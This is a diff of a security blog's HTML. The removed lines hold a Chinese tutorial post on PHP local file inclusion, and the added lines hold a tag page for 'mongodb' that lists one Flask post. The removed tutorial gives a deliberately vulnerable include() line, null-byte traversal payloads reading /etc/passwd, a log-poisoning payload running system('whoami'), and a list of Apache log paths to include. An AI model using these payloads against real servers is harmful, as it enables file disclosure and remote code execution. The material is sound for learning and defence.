@@ -5,62 +5,22 @@
   <meta http-equiv="X-UA-Compatible" content="chrome=1">
   
   <title>
-    PHP本地文件包含(LFI)漏洞利用 | Virink&#39;s Blog 
+    標籤: mongodb 
   </title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
   <meta name="author" content="Virink">
 
 
-<meta name="description" content="0x00 案例
-参考资料：http://downloads.ackack.net/LocalFileInclusion.pdf
-实验代码：
-&amp;lt;?php
-include($_GET[&apos;for&apos;].‘.php’);//用于测试本地包含漏洞
-?&amp;gt;
-
-Linux
-test.php?for=/etc/passwd%00
-
-Win
-test.php?for=D:\readme.txt%00
-
-Lo">
-<meta property="og:type" content="article">
-<meta property="og:title" content="PHP本地文件包含(LFI)漏洞利用 | Virink's Blog">
-<meta property="og:url" content="https://www.virzz.com/2016/10/16/PHP本地文件包含(LFI)漏洞利用.html">
+<meta name="description" content="Virink的小窩，記錄與分享一些網絡安全技術文章。">
+<meta property="og:type" content="website">
+<meta property="og:title" content="標籤: mongodb">
+<meta property="og:url" content="https://www.virzz.com/tags/mongodb/index.html">
 <meta property="og:site_name" content="Virink's Blog">
-<meta property="og:description" content="0x00 案例
-参考资料：http://downloads.ackack.net/LocalFileInclusion.pdf
-实验代码：
-&amp;lt;?php
-include($_GET[&apos;for&apos;].‘.php’);//用于测试本地包含漏洞
-?&amp;gt;
-
-Linux
-test.php?for=/etc/passwd%00
-
-Win
-test.php?for=D:\readme.txt%00
-
-Lo">
-<meta property="og:updated_time" content="2016-12-11T16:22:11.000Z">
+<meta property="og:description" content="Virink的小窩，記錄與分享一些網絡安全技術文章。">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="PHP本地文件包含(LFI)漏洞利用 | Virink's Blog">
-<meta name="twitter:description" content="0x00 案例
-参考资料：http://downloads.ackack.net/LocalFileInclusion.pdf
-实验代码：
-&amp;lt;?php
-include($_GET[&apos;for&apos;].‘.php’);//用于测试本地包含漏洞
-?&amp;gt;
-
-Linux
-test.php?for=/etc/passwd%00
-
-Win
-test.php?for=D:\readme.txt%00
-
-Lo">
+<meta name="twitter:title" content="標籤: mongodb">
+<meta name="twitter:description" content="Virink的小窩，記錄與分享一些網絡安全技術文章。">
 
   <!-- favicon icon files -->
 
@@ -167,119 +127,58 @@ Lo">
     <div class="content-wrapper__inner entry">
       <!-- body panel -->
       
-<article class="post-container post-container--single">
-  <header class="post-header">
-    <h1 class="post-title">PHP本地文件包含(LFI)漏洞利用</h1>
-    
-    <div class="post-meta">
-      <time datetime="2016-10-16 12:29:29" class="post-meta__date date">2016-10-16 12:29:29</time> 
-      <span class="post-meta__tags tags">
-      
-      
-        &#8226; 标签:
-        <font class="tags">
-        <a class="tags-link" href="/tags/php/">php</a>, <a class="tags-link" href="/tags/web/">web</a>
-        </font>
-      
-      </span>
-    </div>
-    
-  </header>
-  <section id="post-content" class="article-content post">
-  <h2>0x00 案例</h2>
-<p>参考资料：http://downloads.ackack.net/LocalFileInclusion.pdf</p>
-<p><strong>实验代码：</strong></p>
-<pre><code>&lt;?php
-include($_GET['for'].‘.php’);//用于测试本地包含漏洞
-?&gt;
-</code></pre>
-<h3>Linux</h3>
-<pre><code>test.php?for=/etc/passwd%00
-</code></pre>
-<h3>Win</h3>
-<pre><code>test.php?for=D:\readme.txt%00
-</code></pre>
-<h2>Log Injection</h2>
-<p>訪問任意頁面，問號後面寫payload，將payload寫入到log中，然後包含log文件執行payload。</p>
-<pre><code>test.php?&lt;php%20system('whoami');?&gt;
-</code></pre>
-<p>當然，需要服務器開啟日誌記錄功能。</p>
-<h2>DoFuck</h2>
-<pre><code>//linux
-test.php?for=/var/log/apache/logs/access_log%00
-//win
-test.php?for=..\apache\logs\access.log%00
-</code></pre>
-<h2>附录：可能的log路径</h2>
-<pre><code>/etc/httpd/logs/access.log
-/etc/httpd/logs/access_log
-/etc/httpd/logs/error.log
-/etc/httpd/logs/error_log
-/opt/lampp/logs/access_log
-/opt/lampp/logs/error_log
-/usr/local/apache/log
-/usr/local/apache/logs
-/usr/local/apache/logs/access.log
-/usr/local/apache/logs/access_log
-/usr/local/apache/logs/error.log
-/usr/local/apache/logs/error_log
-/usr/local/etc/httpd/logs/access_log
-/usr/local/etc/httpd/logs/error_log
-/usr/local/www/logs/thttpd_log
-/var/apache/logs/access_log
-/var/apache/logs/error_log
-/var/log/apache/access.log
-/var/log/apache/error.log
-/var/log/apache-ssl/access.log
-/var/log/apache-ssl/error.log
-/var/log/httpd/access_log
-/var/log/httpd/error_log
-/var/log/httpsd/ssl.access_log
-/var/log/httpsd/ssl_log
-/var/log/thttpd_log
-/var/www/log/access_log
-/var/www/log/error_log
-/var/www/logs/access.log
-/var/www/logs/access_log
-/var/www/logs/error.log
-/var/www/logs/error_log
-C:\apache\logs\access.log
-C:\apache\logs\error.log
-C:\Program Files\Apache Group\Apache\logs\access.log
-C:\Program Files\Apache Group\Apache\logs\error.log
-C:\program files\wamp\apache2\logs
-C:\wamp\apache2\logs
-C:\wamp\logs
-C:\xampp\apache\logs\access.log
-C:\xampp\apache\logs\error.log
-</code></pre>
 
-  </section>
-  <div class="copyright">
-    <span>文本標題:</span><a href="/2016/10/16/PHP本地文件包含(LFI)漏洞利用.html" target="_blank">PHP本地文件包含(LFI)漏洞利用</a><br />
-    <span>文章作者:</span><a href="/" title="回到主页" target="_blank">Virink</a><br />
-    <span>發佈時間:</span>2016-10-16 12:29:29<br />
-    <span>最後更新:</span>2016-12-12 00:22:11<br />
-    <span>原始鏈接:</span><a class="post-url" href="https://www.virzz.com/2016/10/16/PHP本地文件包含(LFI)漏洞利用.html" title="PHP本地文件包含(LFI)漏洞利用" target="_blank">https://www.virzz.com/2016/10/16/PHP本地文件包含(LFI)漏洞利用.html</a><br />
-    <span>轉載聲明:</span><i class="fa fa-creative-commons"></i>转载请保留原文链接及作者。
-  </div>
-  
-<section class="post-comments">
-    <div class="ds-thread" data-thread-key="2016/10/16/PHP本地文件包含(LFI)漏洞利用.html" data-title="PHP本地文件包含(LFI)漏洞利用" data-url="https://www.virzz.com/2016/10/16/PHP本地文件包含(LFI)漏洞利用.html"></div>
-    <script type="text/javascript">
-    var duoshuoQuery = {short_name:"virink"};
-      (function() {
-        var ds = document.createElement('script');
-        ds.type = 'text/javascript';ds.async = true;
-        ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
-        ds.charset = 'UTF-8';
-        (document.getElementsByTagName('head')[0] 
-         || document.getElementsByTagName('body')[0]).appendChild(ds);
-      })();
-      </script>
-</section>
 
-</article>
+  <h1 class="archive-title">標籤: mongodb</h1>
+  <hr class="post-list__divider" />
+
+
+<div class="main-post-list">
+    <ol class="post-list">
+    
+    
+    <li>
+
+      <h2 class="post-list__post-title post-title">
+        <a href="/2017/02/06/Flask-mongoengine 用法小記.html" title="link to Flask-mongoengine 用法小記">Flask-mongoengine 用法小記</a>
+      </h2>
+
+      <div class="post-list__meta">
+
+        <time datetime="2017-02-06" class="post-list__meta--date date">2017-02-06</time> 
+
+        <span class="post-list__meta--tags tags">
+          
+            &#8226; 标签:
+            <font class="tags">
+            <a class="tags-link" href="/tags/flask/">flask</a>, <a class="tags-link" href="/tags/mongodb/">mongodb</a>, <a class="tags-link" href="/tags/python/">python</a>
+            </font>
+          
+        </span>
+
+      </div>
+
+      <div class="excerpt">
+        
+      </div>
+
+      <hr class="post-list__divider" />
+    </li>
+    
+  </ol>
+
+  <hr class="post-list__divider " />
+
+<nav class="pagination" role="navigation">
+    
+
+    <span class="pagination__page-number"> 1 / 1</span>
+    
+    
+</nav>
+
+
+</div>
       <!-- footer panel -->
       <footer class="footer">
 	<center>
@@ -295,38 +194,6 @@ C:\xampp\apache\logs\error.log
   <script src="/js/main.js"></script>
   <script src="/js/scale.fix.js"></script>
   <script src="/js/tagcloud.js"></script>
-  
-  
-	<script src="/js/jquery.fancybox.js"></script>
-	<script type="text/javascript">
-		$(document).ready(function() {
-			// $('.fancybox').fancybox();
-			$(".fancybox").fancybox({
-	            padding: 0,
-	            helpers: {
-	                overlay: {
-	                  locked: false
-	                }
-	            }
-	        });
-		});
-	</script>
-
-  
-    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
-    <script type="text/javascript"> 
-        $(document).ready(function(){
-            MathJax.Hub.Config({ 
-                tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
-            });
-        });
-    </script>
-
-  <script src="//cdn.bootcss.com/highlight.js/9.8.0/highlight.min.js"></script>
-  <script src="/js/gallery.js"></script>
-  <script>
-  hljs.initHighlightingOnLoad();
-  </script>
   
   
 <div id="totop" style="position: fixed; bottom: 50px; right: 30px; cursor: pointer; opacity: 1;">
